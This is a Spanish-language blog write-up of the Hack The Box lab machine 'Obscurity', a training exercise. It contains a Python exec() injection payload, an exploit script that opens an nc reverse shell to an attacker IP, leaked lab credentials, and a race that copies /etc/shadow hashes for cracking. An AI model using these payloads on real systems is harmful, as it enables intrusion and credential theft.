<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Obscurity [Active] :: sckull — TryHackMe, HackTheBox, CTF Writeups</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Obscurity     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.168   Maker clubby789    NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/obscurity/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Obscurity [Active] :: sckull — TryHackMe, HackTheBox, CTF Writeups" />
<meta name="twitter:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Obscurity     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.168   Maker clubby789    NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/obscurity/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Obscurity [Active] :: sckull — TryHackMe, HackTheBox, CTF Writeups">
<meta property="og:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Obscurity     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.168   Maker clubby789    NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap." />
<meta property="og:url" content="https://sckull.github.io/posts/obscurity/" />
<meta property="og:site_name" content="Hack The Box - Obscurity [Active]" />
<meta property="og:image" content="https://sckull.github.io/image/htb/obscurity/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Obscurity [Active]",
        "headline" : "Hack The Box - Obscurity [Active]",
        "description" : "Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Obscurity     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.168   Maker clubby789    NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-01-26 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-01-26 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/obscurity/",
        "wordCount" : "1331",
        "keywords" : [ "hackthebox","linux","writeup","walkthrough","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-01-26 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Obscurity [Active]</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Sunday, Jan 26, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 7 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/writeup/"><li class="fa fa-tag"></li> writeup</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/walkthrough/"><li class="fa fa-tag"></li> walkthrough</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/obscurity/../../image/htb/obscurity/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      
    </div>

    <div class="post-content">      
      <ul>
<li><em>Contenido protegido por contraseña.</em></li>
<li><em>Para desbloquear el contenido debes Ingresar la flag <code>root.txt</code> de la maquina.</em></li>
</ul>


<hugo-encrypt>
	
	<div id="hugo-encrypt-encryption-notice">
		<p></p>
		<noscript><span id="hugo-encrypt-enable-js">Javascript needs to be enabled to decrypt content</span></noscript>

		<div class='hugo-encrypt-form'>
			<input
				class="hugo-encrypt-input"
				id="hugo-encrypt-password"
				placeholder=''
			/>
			<input
				class="button"
				type="button"
				value='Enviar '
				id="button" onclick="hugoDecrypt(document.getElementById('hugo-encrypt-password').value,'input')"
			/>
			<div id="hugo-encrypt-input-response"></div>
		</div>
	</div>
	<cipher-text data-password='512fd4429f33a113a44d5acde23609e3' style="display:none;">
		<table>
<thead>
<tr>
<th>Nombre</th>
<th>Obscurity</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Linux</td>
</tr>

<tr>
<td>Puntos</td>
<td>30</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.168</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/83743">clubby789</a></td>
</tr>
</tbody>
</table>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puertos tcp/udp y servicios con masscan y nmap.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Jan  8 20:18:09 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.168
Nmap scan report for 10.10.10.168
Host is up (0.27s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 09 Jan 2020 02:23:51
|     Server: BadHTTPServer
|     Last-Modified: Thu, 09 Jan 2020 02:23:51
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;title&gt;0bscura&lt;/title&gt;
|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
|     &lt;!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     &lt;!-- stylesheet css --&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
|     &lt;/head&gt;
|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
|     &lt;!-- preloader section --&gt;
|     &lt;!--
|     &lt;div class=&quot;preloader&quot;&gt;
|     &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 09 Jan 2020 02:23:52
|     Server: BadHTTPServer
|     Last-Modified: Thu, 09 Jan 2020 02:23:52
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;title&gt;0bscura&lt;/title&gt;
|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
|     &lt;!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     &lt;!-- stylesheet css --&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
|     &lt;/head&gt;
|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
|     &lt;!-- preloader section --&gt;
|     &lt;!--
|     &lt;div class=&quot;preloader&quot;&gt;
|_    &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=1/8%Time=5E168E70%P=x86_64-pc-linux-gnu%r(Get
[ ... snip ... ]
SF:-spinner\x20sk-spinner-wordpress\&quot;&gt;\n&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  8 20:24:22 2020 -- 1 IP address (1 host up) scanned in 373.38 seconds
</code></pre>

<h3 id="http">HTTP</h3>

<p>En el puerto 8080 encontramos una pagina web, la cual contiene informacion sobre una <strong>empresa</strong>.
<img src="../../image/htb/obscurity/Screenshot_2020-01-10_00-33-30.png" alt="image" /></p>

<p>En la parte de abajo encontramos un mensaje dirigido a los desarrolladores, dando a entender que en el directorio secreto se encuentra el codigo fuente de la pagina.
<img src="../../image/htb/obscurity/Screenshot_2020-01-10_00-34-29.png" alt="image" /></p>

<h3 id="wfuzz">WFUZZ</h3>

<p>Utilizamos wfuzz para encontrar el archivo &lsquo;SuperSecureServer.py&rsquo;.</p>

<pre><code class="language-bash">root@aoiri:~/htb/obscurity# wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt --hc 404

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                             
===================================================================

000001245:   200        170 L    498 W    5892 Ch     &quot;develop&quot;                                                                           

Total time: 116.5698
Processed Requests: 4614
Filtered Requests: 4613
Requests/sec.: 39.58142
</code></pre>

<p>Encontramos el archivo &lsquo;SuperSecureServer.py&rsquo; del servidor.
<img src="../../image/htb/obscurity/Screenshot_2020-01-10_00-36-33.png" alt="image" /></p>

<h2 id="rce-supersecureserver-py">RCE - SuperSecureServer.py</h2>

<p>Analizamos el codigo del archivo y encontramos una vulnerabilidad la cual se encuentra al realizar una consulta a de un directorio. Al pasarle un directorio (&lsquo;directorioABC&rsquo;) entre comillas, este elimina las comillas, pasa por la funcion <code>exec()</code> y se utiliza el directorio como una variable en un string, en el caso de que no haya errores sigue ejecutandose el codigo.</p>

<p>Codigo vulnerable:</p>

<pre><code class="language-python">path = urllib.parse.unquote(path)
    try:
        info = &quot;output = 'Document: {}'&quot; # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
</code></pre>

<p>Utilizamos el siguiente payload para ejecutar comandos:</p>

<pre><code class="language-bash">'\'\n\nos.system(&quot; COMANDO &quot;)\n #&quot;'
</code></pre>

<p>Realizamos pruebas haciendo una consultas DNS a nuestra maquina:</p>

<pre><code class="language-python">cmd = '\'\n\nos.system(&quot;nslookup $PATH 10.10.15.122&quot;)\n #&quot;'
</code></pre>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_00-53-20.png" alt="image" /></p>

<p>Ejecutamos una shell inversa y obtenemos acceso con el usuario www-data:</p>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_00-53-59.png" alt="image" /></p>

<p>Codigo:</p>

<pre><code class="language-python">import requests
import urllib

#cmd = '\'\n\nos.system(&quot; COMMAND &quot;)\n #&quot;'
#cmd = '\'\n\nos.system(&quot;nslookup $(which nc) 10.10.14.14&quot;)\n #&quot;'
cmd = '\'\n\nos.system(&quot; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 1336 &gt;/tmp/f &quot;)\n #&quot;'

path = urllib.parse.quote(cmd, safe='')
print(path)

url = &quot;http://obscure.htb:8080/&quot;+path
r = requests.get(url)
</code></pre>

<h2 id="user-robert">USER - Robert</h2>

<p>Enumeramos la carpeta principal del usuario robert, encontramos varios archivos, un script en python que <strong>encripta/desencripta</strong> archivos utilizando una clave.</p>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_14-54-17.png" alt="image" /></p>

<p>Tambien vemos archivos en texto plano, pero dos de ellos parecen estar encriptados por el script.</p>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_14-56-43.png" alt="image" /></p>

<p>Al ejecutar el script nos muestra los parametros que necesita para encriptar y desencriptar un archivo.</p>

<pre><code class="language-bash">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -h
python3 SuperSecureCrypt.py -h
usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]

Encrypt with 0bscura's encryption algorithm

optional arguments:
  -h, --help  show this help message and exit
  -i InFile   The file to read
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode
www-data@obscure:/home/robert$
</code></pre>

<p>Utilizamos dicho script para poder desencriptar el archivo <code>out.txt</code> con el archivo <code>check.txt</code> como clave para obtener la clave de encriptacion:</p>

<pre><code class="language-bash">python3 SuperSecureCrypt.py -i out.txt -o /tmp/what.txt -k &quot;$(cat check.txt)&quot; -d
</code></pre>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_15-00-04.png" alt="image" /></p>

<p>Utilizamos la clave para poder desencriptar el archivo out.txt y vemos que es el mismo mensaje que el archivo check.txt tiene, por lo que ya tenemos la clave:</p>

<pre><code class="language-bash">python3 SuperSecureCrypt.py -i out.txt -o /tmp/what2.txt -k &quot;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich&quot; -d
</code></pre>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_15-02-54.png" alt="image" /></p>

<p>Utilizamos la clave para desencriptar el archivo <code>passwordreminder.txt</code>:</p>

<pre><code class="language-bash">python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/what3.txt -k &quot;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich&quot; -d
</code></pre>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_15-04-18.png" alt="image" /></p>

<p>Obtenemos una contraseña, utilizamos la contraseña con el usuario robert y obtenemos una shell y nuestra flag <strong>user.txt</strong>:</p>

<pre><code>robert:SecThruObsFTW
</code></pre>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_15-05-25.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Enumeramos los comandos que pueden ser ejecutados con privilegios de root sin contraseña, encontramos un script en python.</p>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_15-06-47.png" alt="image" /></p>

<p>Dicho script pregunta por usuario y su contraseña existentes en la maquina, lee <code>/etc/shadow</code> y escribe su contenido en <code>/tmp/SSH/</code>, solo si las credenciales dadas corresponden a uno de los usuarios, el script ejecuta los comandos que se le pasen y elimina el archivo creado en /tmp/SSH/.</p>

<p>Ya que tenemos un usuario con sus credenciales ejecutamos el script pasando el usuario robert y la contraseña <code>SecThruObsFTW</code>, al hacer esto se escribira en /tmp/SSH/ las contraseñas encriptadas de la maquina.</p>

<pre><code class="language-bash">/usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
</code></pre>

<p>Al mismo tiempo en otra shell utilizamos <code>watch</code> para ver los cambios que hay en /tmp/SSH/ obteniendo con <code>cat</code> el archivo temporal de las contraseñas.</p>

<pre><code class="language-bash">watch -t -d -g -n 0.1 &quot;cat /tmp/SSH/* |base64 &gt; /tmp/b.txt &quot;
</code></pre>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_17-52-37.png" alt="image" /></p>

<p>Obtenemos el hash del usuario root y robert, utilizamos John The Ripper para desencriptar la contraseña.</p>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_17-55-28.png" alt="image" /></p>

<p>Obtenemos la contraseña, una shell con privilegios root y nuestra flag <strong>root.txt</strong>.
root:mercedes</p>

<p><img src="../../image/htb/obscurity/Screenshot_2020-01-10_17-57-02.png" alt="image" /></p>

	</cipher-text>
	<style type="text/css">
		div#hugo-encrypt-sha1sum {display: none;}
		button, .button{  
			align-items: center;
			justify-content: center;
			padding: 8px 18px;
			margin-bottom: 5px;
			background: var(--dark-background-secondary);
			color: inherit;
			text-decoration: none;
			text-align: center;
			font-weight: 500;
			border-radius: 8px;
			border: 1px solid transparent;
			appearance: none;
			cursor: pointer;
			outline: none;
		  }
	</style>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js"></script>
	<script>
		
		let cipher = document.getElementsByTagName("cipher-text")[0];
		const storageKey = location.pathname + "password";
		const userStorage =  window['sessionStorage'] ;
		

		function str2buf(str) {
			return new TextEncoder("utf-8").encode(str);
		}
		

		function buf2str(buffer) {
			return new TextDecoder("utf-8").decode(buffer);
		}
		

		function hex2buf(hexStr) {
			return new Uint8Array(hexStr.match(/.{2}/g).map(h => parseInt(h, 16)));
		}
		

		function deriveKey(passphrase, salt) {
			salt = salt || crypto.getRandomValues(new Uint8Array(8));
			return crypto.subtle
				.importKey("raw", str2buf(passphrase), "PBKDF2", false, ["deriveKey"])
				.then(key =>
					crypto.subtle.deriveKey(
						{ name: "PBKDF2", salt, iterations: 1000, hash: "SHA-256" },
						key,
						{ name: "AES-GCM", length: 256 },
						false,
						["encrypt", "decrypt"],
					),
				)
				.then(key => [key, salt]);
		}
		

		function decrypt(passphrase, saltIvCipherHex) {
			const [salt, iv, data] = saltIvCipherHex.split("-").map(hex2buf);
			return deriveKey(passphrase, salt)
				.then(([key]) => crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data))
				.then(v => buf2str(new Uint8Array(v)));
		}
		

		const hugoDecrypt = function(password, type) {
				decrypt(password, cipher.innerText).then(function(decrypted_text) {
					

					let hash = CryptoJS.SHA1(decrypted_text.replace(/\r?\n?[^\r\n]*$/, ""));
					let sha1_sum = CryptoJS.enc.Hex.stringify(hash);

					if ( decrypted_text.includes(sha1_sum) ) {
						document.getElementById("hugo-encrypt-encryption-notice").remove();
						cipher.outerHTML = decrypted_text;
						userStorage.setItem(storageKey, password);
						document.getElementById("hugo-encrypt-sha1sum").innerHTML = "Success: " + sha1_sum;
						$('pre').addClass('code-toolbar language-bash');
						$('code').addClass('language-bash');
                        console.log("Decryption successful. Storing password in sessionStorage.");
					}
					}).catch(function(error) {
                    if (type === "input") {
                        document.getElementById("hugo-encrypt-input-response").innerHTML = "";
                        console.log('', error);
                    } else if (type === "storage") {
                        userStorage.removeItem(location.pathname + "password");
                        console.log("Password changed. Clearing userStorage.", error);
                    }
                });
			};
	</script>
	<script>
		window.onload = () => {
			if (userStorage.getItem(storageKey)) {
				console.log("Found storageKey in userStorage. Attemtping decryption");
				hugoDecrypt(userStorage.getItem(storageKey), "storage");
			}
		};
	</script>
</hugo-encrypt>



    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/nest/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Nest [Active]</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/resolute/">
                <span class="button__text">Hack The Box - Resolute [Active]</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
